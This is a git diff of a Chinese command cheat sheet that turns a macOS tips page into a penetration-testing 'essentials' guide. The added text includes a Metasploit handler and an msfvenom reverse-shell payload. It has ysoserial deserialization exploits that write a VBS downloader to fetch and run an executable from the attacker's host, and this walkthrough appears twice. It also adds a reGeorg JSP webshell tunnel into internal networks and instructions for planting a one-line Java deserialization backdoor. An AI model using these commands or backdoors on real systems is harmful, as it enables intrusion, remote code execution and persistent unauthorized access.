@@ -1,8 +1,10 @@
-# mac os 系统完美命令大全
-author: M.T.X. 2018-05-14 
+# 渗透干货
+author: M.T.X. 2018-05-17 
 
 ## other awesome-macos-command-line
 ```
+https://github.com/hktalent/tools/awesome-macos-command-line
+https://github.com/enaqx/awesome-pentest
 https://github.com/herrbischoff/awesome-macos-command-line
 ```
 
@@ -11,176 +13,36 @@ https://github.com/herrbischoff/awesome-macos-command-line
 export xxx = `whoami`
 ```
 
-## brew install
-```
-xcode-select --install
-cd /usr/local/
-mkdir homebrew && curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
-brew update;brew upgrade;brew cleanup
-```
+### DEF CON China 1资料下载
 
-## curl 安装最新的
-为了规避在使用proxifier,proxychanis的时候发生
-https://github.com/libressl-portable/portable/issues/369的问题
-
-```
-fatal: unable to access 'https://github.com/Homebrew/homebrew-services/': LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443
-
-curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL
-
-这样的错误
-brew install LibreSSL
-brew reinstall --HEAD --with-rtmpdump --with-openssl --with-nghttp2 --with-libmetalink --with-gssapi --with-c-ares  curl
-vi ~/.curlrc
---ciphers DEFAULT
-```
-
-### 服务启动、重启
-```
-brew services list 
-brew services restart mongodb
-```
-
-## 更新修复brew bug
-```
-https://github.com/Homebrew/brew
-cd "$(brew --repo)" && git fetch && git reset --hard origin/master && brew update
-```
-
-## 强烈推荐，终端工具	
-```
-brew install caskroom/cask/iterm2
-```
-
-## wget好东西
 ```
 brew install wget
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg,ppt,pptx,pdf,doc,docx,zip,rar" https://media.defcon.org/DEF%20CON%20China%201/
 ```
 
 
-## 文本转语音
+### 学习资料抓取
 ```
-say -v Ting-Ting -f file.txt -o "output.m4a"
-say -v Sin-ji '你好，你是猪吗'
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/ruby/ruby-intro.html
 
-say -v ?
-Alex                en_US    # Most people recognize me by my voice.
-Alice               it_IT    # Salve, mi chiamo Alice e sono una voce italiana.
-Alva                sv_SE    # Hej, jag heter Alva. Jag är en svensk röst.
-Amelie              fr_CA    # Bonjour, je m’appelle Amelie. Je suis une voix canadienne.
-Anna                de_DE    # Hallo, ich heiße Anna und ich bin eine deutsche Stimme.
-Carmit              he_IL    # שלום. קוראים לי כרמית, ואני קול בשפה העברית.
-Damayanti           id_ID    # Halo, nama saya Damayanti. Saya berbahasa Indonesia.
-Daniel              en_GB    # Hello, my name is Daniel. I am a British-English voice.
-Diego               es_AR    # Hola, me llamo Diego y soy una voz española.
-Ellen               nl_BE    # Hallo, mijn naam is Ellen. Ik ben een Belgische stem.
-Fiona               en-scotland # Hello, my name is Fiona. I am a Scottish-English voice.
-Fred                en_US    # I sure like being inside this fancy computer
-Ioana               ro_RO    # Bună, mă cheamă Ioana . Sunt o voce românească.
-Joana               pt_PT    # Olá, chamo-me Joana e dou voz ao português falado em Portugal.
-Jorge               es_ES    # Hola, me llamo Jorge y soy una voz española.
-Juan                es_MX    # Hola, me llamo Juan y soy una voz mexicana.
-Kanya               th_TH    # สวัสดีค่ะ ดิฉันชื่อKanya
-Karen               en_AU    # Hello, my name is Karen. I am an Australian-English voice.
-Kyoko               ja_JP    # こんにちは、私の名前はKyokoです。日本語の音声をお届けします。
-Laura               sk_SK    # Ahoj. Volám sa Laura . Som hlas v slovenskom jazyku.
-Lekha               hi_IN    # नमस्कार, मेरा नाम लेखा है. मैं हिन्दी में बोलने वाली आवाज़ हूँ.
-Luca                it_IT    # Salve, mi chiamo Luca e sono una voce italiana.
-Luciana             pt_BR    # Olá, o meu nome é Luciana e a minha voz corresponde ao português que é falado no Brasil
-Maged               ar_SA    # مرحبًا اسمي Maged. أنا عربي من السعودية.
-Mariska             hu_HU    # Üdvözlöm! Mariska vagyok. Én vagyok a magyar hang.
-Mei-Jia             zh_TW    # 您好，我叫美佳。我說國語。
-Melina              el_GR    # Γεια σας, ονομάζομαι Melina. Είμαι μια ελληνική φωνή.
-Milena              ru_RU    # Здравствуйте, меня зовут Milena. Я – русский голос системы.
-Moira               en_IE    # Hello, my name is Moira. I am an Irish-English voice.
-Monica              es_ES    # Hola, me llamo Monica y soy una voz española.
-Nora                nb_NO    # Hei, jeg heter Nora. Jeg er en norsk stemme.
-Paulina             es_MX    # Hola, me llamo Paulina y soy una voz mexicana.
-Samantha            en_US    # Hello, my name is Samantha. I am an American-English voice.
-Sara                da_DK    # Hej, jeg hedder Sara. Jeg er en dansk stemme.
-Satu                fi_FI    # Hei, minun nimeni on Satu. Olen suomalainen ääni.
-Sin-ji              zh_HK    # 您好，我叫 Sin-ji。我講廣東話。
-Tessa               en_ZA    # Hello, my name is Tessa. I am a South African-English voice.
-Thomas              fr_FR    # Bonjour, je m’appelle Thomas. Je suis une voix française.
-Ting-Ting           zh_CN    # 您好，我叫Ting-Ting。我讲中文普通话。
-Veena               en_IN    # Hello, my name is Veena. I am an Indian-English voice.
-Victoria            en_US    # Isn't it nice to have a computer that will talk to you?
-Xander              nl_NL    # Hallo, mijn naam is Xander. Ik ben een Nederlandse stem.
-Yelda               tr_TR    # Merhaba, benim adım Yelda. Ben Türkçe bir sesim.
-Yuna                ko_KR    # 안녕하세요. 제 이름은 Yuna입니다. 저는 한국어 음성입니다.
-Yuri                ru_RU    # Здравствуйте, меня зовут Yuri. Я – русский голос системы.
-Zosia               pl_PL    # Witaj. Mam na imię Zosia, jestem głosem kobiecym dla języka polskiego.
-Zuzana              cs_CZ    # Dobrý den, jmenuji se Zuzana. Jsem český hlas.
-```
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/python
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/python3
 
-## How to Set a Specific IP Address via Terminal in OS X
-```
-sudo ipconfig set en1 INFORM 192.168.0.150
-sudo ifconfig en1 down ; sudo ifconfig en1 up
-sudo ipconfig set en1 DHCP
-```
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" https://www.w3cschool.cn/ruby/
 
-## 获取本机ip
+wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" https://www.w3cschool.cn/python/
 ```
-ifconfig | grep inet | grep -v inet6 | cut -d" " -f2 | tail -n1
-ifconfig | grep inet | grep -v inet6 | cut -d" " -f2,3 
+## base64编码、解码，在后渗透中编码命令很有用
 ```
-### 文本中获取本机ip
+base64 -D -i gfwlist.txt
+cat ok.txt|base64
 ```
-cat 内网445漏洞主机.txt|grep -E "\.(28|29|31)\." |cut -d" " -f2 |cut -d":" -f1
-cat 内网445漏洞主机.txt |cut -d" " -f2 |cut -d":" -f1
-```
-## 去除重复文件
-```
-brew reinstall fdupes
-fdupes -d  -N -r  /Volumes/mtx_hktalent/bak/loot
-fdupes -d  -N -r  /Volumes/mtx_hktalent/Awesome
--s --symlinks    	follow symlinks
--H --hardlinks   	normally, when two or more files point to the same
-                  	disk area they are treated as non-duplicates; this
-                  	option will change this behavior
-```
-
-## 查看数据包及路由情况
-```
-netstat -r
-```
-## 查看路由情况
-```
-route get google.com
-```
-
 ## 查看当前ip
 ```
 ipconfig getifaddr en0
 ipconfig getifaddr bridge0
 ```
-## 显示网络配置
-```
-scselect
-```
-## 设置静态ip
-```
-networksetup -setmanual "Ethernet" 192.168.2.100 255.255.255.0 192.168.2.1
-```
-### 设置代理
-```
-$ networksetup -getmacaddress Ethernet
-networksetup -getmacaddress 'Thunderbolt Ethernet'
-networksetup -setwebproxy wi-fi ip port
-https设置代理
-networksetup -setsecurewebproxy wi-fi ip port
-```
-### 关闭代理
-```
-networksetup -setwebproxystate wi-fi off
-networksetup -setsecurewebproxystate wi-fi off
-```
-### 获取mac地址
-```
-networksetup -listallnetworkservices | grep -v "An asterisk"
-networksetup -getmacaddress wi-fi
-```
+
 ## 参看特定端口进程、使用情况
 ```
 sudo lsof -i :5432
@@ -220,10 +82,6 @@ curl -s https://api.ipify.org && echo
 curl -s http://ip.cn
 ```
 
-## 显示所有分区信息
-```
-diskutil list
-```
 ## 文件MD5、sha1、sha512摘要
 ```
 brew install openssl
@@ -246,17 +104,6 @@ sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Users/${xxx}/.rvm/ru
 sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /Users/${xxx}/.rvm/rubies/ruby-2.4.3/bin/ruby
 ```
 
-## 磁盘检查
-```
-fsck_hfs -fy -x /dev/rdisk2s1
-```
-## mac系统拒绝访问某些域名
-```
-sudo vi /etc/hosts
-127.0.0.1	secclientgw.alipay.com
-令生效
-sudo dscacheutil -flushcache
-```
 ## 苹果系统查看端口对应的pid
 ```
 Depending on your version of Mac OS X, use one of these:
@@ -273,6 +120,19 @@ lsof -n -i:59395
 ## 临时设置允许打开的文件最大数量
 ```
 ulimit -n 65535
+```
+## 经典端口扫描
+```
+brew install nmap
+brew install masscan
+sudo port install arp-scan
+sudo masscan -p1099 --rate=1000 192.168.0.1/16
+```
+
+## 发现sniffer的人
+```
+brew install nmap
+nmap --script=sniffer-detect 192.168.24.0/24
 ```
 
 ## 防止ARP中间人攻击、设置静态mac 地址
@@ -334,47 +194,7 @@ ln -s /Volumes/mtx_hktalent/${xxx}/com.tencent.xinWeChat /Users/`whoami`/Library
 sudo mv /Users/`whoami`/Library/Containers/com.tencent.qq /Volumes/mtx_hktalent/`whoami`/
 ln -s /Volumes/mtx_hktalent/`whoami`/com.tencent.qq /Users/`whoami`/Library/Containers/com.tencent.qq
 ```
-### port删除不使用的包
-```
-sudo port -f uninstall inactive
-sudo port uninstall inactive
-```
-### 清除编译临时文件
-```
-sudo port -f clean --all all
-sudo rm -rf /opt/local/var/macports/build/*
-```
-### 清除下载临时文件
-```
-sudo rm -rf /opt/local/var/macports/distfiles/*
-sudo rm -rf /opt/local/var/macports/packages/*
-```
-### brew清除旧版本和不用的服务
-```
-brew services cleanup;brew cleanup
-```
-### 批量删除.svn目录及文件、删除缓存文件
-```
-find . -name .svn -exec rm -rf "{}" \;
-find . -name ._* -exec rm -rf "{}" \;
-find . -name "._*.*"  -exec rm -rf "{}" \;
-find . -name "._*.eml"  -exec rm -rf "{}" \;
-find . -name "*).eml" -exec  rm -rf {} \;
-find . -name ".DS_Store" -exec rm -rf "{}" \;
-```
-### 清理
-```
-rm -rf "/Users/`whoami`/Library/Developer/Xcode/iOS DeviceSupport/*"
-rm -rf "/Users/`whoami`/Library/Application Support/iPhone Simulator/7.1/tmp/*"
-sudo rm -rf /System/Library/Caches/com.apple.coresymbolicationd/data
-ls -la /opt/local/var/macports
-lrwxr-xr-x  1 ${xxx}  staff  36 Aug  7  2016 /opt/local/var/macports -> /Volumes/BOOK/`whoami`/local/macports
-ln -s ~/macports  /opt/local/var/macports
-rm /opt/local/var/macports
-ln -s /Volumes/BOOK/`whoami`/local/macports /opt/local/var/macports
-$ which port
-/opt/local/bin/port
-```
+
 # 更新
 ### port更新
 ```
@@ -416,12 +236,7 @@ apt-get autoclean ;  apt-get update ; apt-get upgrade -y ; apt-get dist upgrade 
 openvas-nvt-sync
 apt-get update;apt-get upgrade;apt-get dist-upgrade;apt-get autoclean
 ```
-### brew自身更新和更新所有软件
-```
-sudo chown -R ${xxx}:wheel /usr/local/Homebrew
-cd /usr/local && sudo chown -R ${xxx}:staff .
-brew update;brew upgrade
-```
+
 ### nessus升级
 ```
 brew install proxychains-ng
@@ -900,5 +715,184 @@ help.findMe(
 )
 2、方法二
 curl http://ipinfo.io/
+```
+<!--
+# 一次简单的渗透
+## 1、运行监听
+等待中招的机器连接回来
+
+```
+./msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT       4445
+run -j -z
+```
+
+## 2、生成攻击代码
+
+```
+cd /Users/`whoami`/safe/top20/metasploit-framework/
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
+```
+
+## 3、监听http服务
+等待中招，存在漏洞的机器连接、下载、运行
+
+```
+cd tmp
+python -m SimpleHTTPServer 9999
+```
+
+## 4、发动攻击
+
+```
+mkdir /Users/`whoami`/safe/
+cd /Users/`whoami`/safe/
+git clone https://github.com/hktalent/myhktools.git myhktools
+cd myhktools
+
+java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+
+java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.28.27 1099 CommonsCollections1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+```
+-->
+
+## 后渗透：http隧道
+
+```
+git clone https://github.com/hktalent/myhktools
+cd myhktools
+1、植入x.jsp
+https://github.com/hktalent/myhktools/py/x.jsp
+2、建立http隧道反向代理
+python py/reGeorgSocksProxy.py -p 8081 -u  http://xx.xxx.com:8070/x1/x.jsp
+
+3、Proxifier设置代理127.0.0.1，8081
+还可以设置特定网段使用该代理
+那么，恭喜你，现在你可以进入内网了
+```
+
+### linux 经典防火墙配置
+
+```
+# 清楚所有的规则
+iptables --flush
+# 禁止ping
+iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP
+# tcp ip协议攻击防御, 例如 慢速攻击防御
+iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -m state --state NEW -j DROP
+iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
+iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
+iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
+iptables -t filter -A INPUT -m state --state INVALID -j DROP
+iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,FIN FIN -j DROP
+iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,PSH PSH -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ACK,URG URG -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL SYN,FIN -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL URG,PSH,FIN -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL FIN -j DROP
+iptables -t filter -A INPUT -p tcp --tcp-flags ALL URG,PSH,SYN,FIN -j DROP
+# 80端口设置相同ip最大并发5
+iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 5 -j REJECT --reject-with tcp-reset
+# 禁止任何445端口的链接、进出，似乎各种勒索病毒外联用这个端口
+sudo iptables -A INPUT -p tcp --dport 445 -j DROP
+sudo iptables -A OUTPUT -p tcp --dport 445 -j DROP
+# 查看当前的拦截情况
+iptables  -L -n -v
+# 带行号，方便基于行号进行删除
+iptables -nL --line-number
+
+
+```
+
+# 一次简单的渗透
+## 1、运行监听
+等待中招的机器连接回来
+
+```
+./msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT       4445
+run -j -z
+```
+
+## 2、生成攻击代码
+
+```
+cd /Users/`whoami`/safe/top20/metasploit-framework/
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
+```
+
+## 3、监听http服务
+等待中招，存在漏洞的机器连接、下载、运行
+
+```
+cd tmp
+python -m SimpleHTTPServer 9999
+```
+
+## 4、发动攻击
+
+```
+mkdir /Users/`whoami`/safe/
+cd /Users/`whoami`/safe/
+git clone https://github.com/hktalent/myhktools.git myhktools
+cd myhktools
+
+java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+
+java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.28.27 1099 CommonsCollections1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+```
+
+# 一行java代码实现超级逼格后门
+```
+1、java、或jsp中添加
+注意：以下代码没有任何能力、道德问题，更不是API readObject问题
+new java.io.ObjectInputStream(request.getInputStream()).readObject();
+或者，柔性、可用空间、限制更少、成功率高的方式
+new java.io.ObjectInputStream(request.getParameter('xxx')).readObject();
+或者启用压缩功能，当然，这增加了该漏洞利用的难度...
+new java.io.ObjectInputStream(new java.util.zip.GZIPInputStream(request.getParameter('xxx'))).readObject();
+
+new java.io.ObjectInputStream(new java.util.zip.DeflaterInputStream(request.getInputStream())).readObject();
+
+2、将【低于、等于commons-collections-3.2.2.jar】版本的放入工程、加载并一起打包发布，或者jre的默认加载目录中
+别管他用没有用，神一样的后门就实现了
+如果中间件是root启动，那么，恭喜你，你已经拥有了这台服务器的超级控制权限了
+
+3、这个故事告诉大家：没有用任何api的jar需要删除，或者升级到安全版本
+否则心跳加速、血压升高的故事会跌宕起伏...
+```
+
+# 各种注入攻击
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings
+```
+
+# http隧道
+[reGeorg]
+[reGeorg]:https://github.com/sensepost/reGeorg
+
+# 行重复统计、并倒序输出
+```
+awk '{name[$1]++} END{for (each in name){print each "[" name[each] "]"}}' regions.txt | sort -t '[' -n -k 2 -r
+
+cat regions.txt
+good
+good
+good
+xxx
+xx
+xxx
+
 ```
 
